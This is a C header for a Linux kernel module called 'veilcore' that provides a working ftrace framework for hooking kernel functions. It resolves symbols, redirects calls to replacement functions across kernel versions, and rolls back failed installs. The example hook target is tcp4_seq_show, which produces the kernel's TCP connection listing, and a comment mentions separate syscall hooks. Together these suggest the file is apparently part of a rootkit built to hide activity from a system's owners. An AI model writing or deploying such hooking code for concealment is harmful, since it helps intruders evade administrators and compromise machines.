/* SPDX-License-Identifier: GPL-2.0 */
/*
 * core.h - ftrace hook framework for the veilcore module.
 *
 * Only veilcore.c compiles against this header.
 */
#ifndef VEILCORE_CORE_H
#define VEILCORE_CORE_H

/* The thunk re-enters the original function through saved pointers; tail-
 * call optimization would redirect those calls and break the trampoline. */
#pragma GCC optimize("-fno-optimize-sibling-calls")

#include <linux/ftrace.h>
#include "compat.h"

struct ftrace_hook {
	const char *name;	/* kernel symbol, e.g. "tcp4_seq_show" */
	void *function;		/* replacement function */
	void *original;		/* address where the original fn pointer is saved */
	unsigned long address;	/* resolved target address */
	struct ftrace_ops ops;
};

#define HOOK(_name, _hook, _orig) {			\
	.name = (_name),				\
	.function = (_hook),				\
	.original = (_orig),				\
}

/* within_module became an inline in module.h at 3.16.68; older kernels get
 * the same composition from the two exported helpers. */
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 16, 68)
static inline int within_module(unsigned long addr, const struct module *mod)
{
	return within_module_init(addr, mod) || within_module_core(addr, mod);
}
#endif

/*
 * The ftrace callback signature changed in 5.11: the fourth argument is
 * struct ftrace_regs * instead of struct pt_regs. (The spec text says 5.8,
 * but struct ftrace_regs only exists from 5.11 - using it earlier would not
 * compile; 5.11 is also the same boundary §4.2 uses for the flags.)
 */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 11, 0)
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
				    struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

	if (!within_module(parent_ip, THIS_MODULE))
		fregs->regs.ip = (unsigned long)hook->function;
}
#else
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
				    struct ftrace_ops *ops, struct pt_regs *regs)
{
	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

	if (!within_module(parent_ip, THIS_MODULE))
		regs->ip = (unsigned long)hook->function;
}
#endif

static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
	hook->address = resolve_sym(hook->name);

	if (!hook->address) {
		pr_err("veilcore: unresolved symbol: %s\n", hook->name);
		return -ENOENT;
	}
	*((unsigned long *)hook->original) = hook->address;
	return 0;
}

static int fh_install_hook(struct ftrace_hook *hook)
{
	int err;

	err = fh_resolve_hook_address(hook);
	if (err)
		return err;

	hook->ops.func = fh_ftrace_thunk;
#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 11, 0)
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS |
			  FTRACE_OPS_FL_RECURSION_SAFE |
			  FTRACE_OPS_FL_IPMODIFY;
#else
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
#endif

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
	if (err) {
		pr_err("veilcore: ftrace_set_filter_ip(%s) failed: %d\n",
		       hook->name, err);
		return err;
	}

	err = register_ftrace_function(&hook->ops);
	if (err) {
		pr_err("veilcore: register_ftrace_function(%s) failed: %d\n",
		       hook->name, err);
		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
		return err;
	}

	return 0;
}

static void fh_remove_hook(struct ftrace_hook *hook)
{
	int err;

	err = unregister_ftrace_function(&hook->ops);
	if (err)
		pr_err("veilcore: unregister_ftrace_function(%s): %d\n",
		       hook->name, err);

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
	if (err)
		pr_err("veilcore: ftrace_set_filter_ip remove(%s): %d\n",
		       hook->name, err);
}

/*
 * Batch install. On failure every ALREADY-INSTALLED hook is removed in
 * reverse order; ftrace failure never touches syscall hooks and never
 * fails the module load.
 */
static int fh_install_hooks(struct ftrace_hook *hooks, unsigned int count)
{
	int err;
	unsigned int i;

	for (i = 0; i < count; i++) {
		err = fh_install_hook(&hooks[i]);
		if (err)
			goto rollback;
	}
	return 0;

rollback:
	while (i-- > 0)
		fh_remove_hook(&hooks[i]);
	return err;
}

static void fh_remove_hooks(struct ftrace_hook *hooks, unsigned int count)
{
	unsigned int i;

	for (i = 0; i < count; i++)
		fh_remove_hook(&hooks[i]);
}

#endif /* VEILCORE_CORE_H */
